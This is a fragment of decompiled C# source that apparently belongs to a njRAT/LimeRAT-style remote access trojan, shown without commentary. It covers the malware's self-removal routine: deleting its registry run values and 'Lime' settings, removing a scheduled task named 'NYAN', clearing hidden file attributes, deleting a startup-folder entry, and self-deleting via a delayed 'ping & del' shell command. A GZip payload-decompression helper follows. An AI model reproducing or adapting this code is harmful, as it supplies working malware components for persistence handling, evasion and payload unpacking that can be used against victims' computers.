		catch (Exception ex)
		{
			ProjectData.SetProjectError(ex);
			Exception projectError2 = ex;
			ProjectData.SetProjectError(projectError2);
			ProjectData.ClearProjectError();
			ProjectData.ClearProjectError();
		}
		try
		{
			((ServerComputer)F).get_Registry().get_LocalMachine().OpenSubKey(sf, writable: true)!.DeleteValue(RG, throwOnMissingValue: false);
		}
		catch (Exception ex2)
		{
			ProjectData.SetProjectError(ex2);
			Exception projectError3 = ex2;
			ProjectData.SetProjectError(projectError3);
			ProjectData.ClearProjectError();
			ProjectData.ClearProjectError();
		}
		try
		{
			Interaction.Shell("schtasks /Delete /tn NYAN /F", (AppWinStyle)0, false, -1);
		}
		catch (Exception projectError4)
		{
			ProjectData.SetProjectError(projectError4);
			ProjectData.ClearProjectError();
		}
		try
		{
			if (HIDE_ME)
			{
				File.SetAttributes(Interaction.Environ(DR) + "\\" + EXE, FileAttributes.Normal);
			}
			File.Delete(Environment.GetFolderPath(Environment.SpecialFolder.Startup) + "\\" + RG);
		}
		catch (Exception ex3)
		{
			ProjectData.SetProjectError(ex3);
			Exception projectError5 = ex3;
			ProjectData.SetProjectError(projectError5);
			ProjectData.ClearProjectError();
			ProjectData.ClearProjectError();
		}
		try
		{
			((ServerComputer)F).get_Registry().get_CurrentUser().OpenSubKey("Software", writable: true)!.DeleteSubKey(RG, throwOnMissingSubKey: false);
			Interaction.DeleteSetting("Lime", (string)null, (string)null);
		}
		catch (Exception ex4)
		{
			ProjectData.SetProjectError(ex4);
			Exception projectError6 = ex4;
			ProjectData.SetProjectError(projectError6);
			ProjectData.ClearProjectError();
			ProjectData.ClearProjectError();
		}
		try
		{
			Interaction.Shell("cmd.exe /c ping 0 -n 2 & del \"" + LO.FullName + "\"", (AppWinStyle)0, false, -1);
		}
		catch (Exception ex5)
		{
			ProjectData.SetProjectError(ex5);
			Exception projectError7 = ex5;
			ProjectData.SetProjectError(projectError7);
			ProjectData.ClearProjectError();
			ProjectData.ClearProjectError();
		}
		ProjectData.EndApp();
	}

	public static byte[] ZIP(byte[] B)
	{
		MemoryStream memoryStream = new MemoryStream(B);
		GZipStream gZipStream = new GZipStream(memoryStream, CompressionMode.Decompress);
		byte[] array = new byte[4];
		checked
		{
			memoryStream.Position = memoryStream.Length - 5L;
			memoryStream.Read(array, 0, 4);
			int num = BitConverter.ToInt32(array, 0);
			memoryStream.Position = 0L;
			byte[] array2 = new byte[num - 1 + 1 - 1 + 1];
			gZipStream.Read(array2, 0, num);
			gZipStream.Dispose();
			memoryStream.Dispose();
			return array2;
		}
	}
}
